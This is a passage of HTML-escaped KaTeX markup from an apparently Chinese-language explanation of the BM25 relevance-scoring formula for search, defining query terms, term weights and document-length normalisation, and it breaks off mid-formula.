class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Q&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;Q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示一条query，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示query中的单词，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;d&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示某个搜索文档，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;W_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示单词权重，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;R&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;表示&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;和d的相关性。&lt;/p&gt;
&lt;p&gt;BM25计算主要有以下几个部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;query中每个单词&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;与文档d之间的相关性：&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;S(q_i,d)=\frac{(k_i+1)tf_{td}}{K+tf_{td}}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.491108em;vertical-align:-0.481108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.01em;&#34;&gt;&lt;span style=&#34;top:-2.6550000000000002em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3448em;&#34;&gt;&lt;span style=&#34;top:-2.3487714285714287em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15122857142857138em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.485em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mopen mtight&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3280857142857143em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose mtight&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3448em;&#34;&gt;&lt;span style=&#34;top:-2.3487714285714287em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15122857142857138em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.481108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mfrac&gt;&lt;msub&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;mrow&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;/mrow&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;K=k_i(1-b+b*\frac{L_d}{L+{ave}}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.2975219999999998em;vertical-align:-0.403331em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.894191em;&#34;&gt;&lt;span style=&#34;top:-2.655em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;e&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.41586em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span 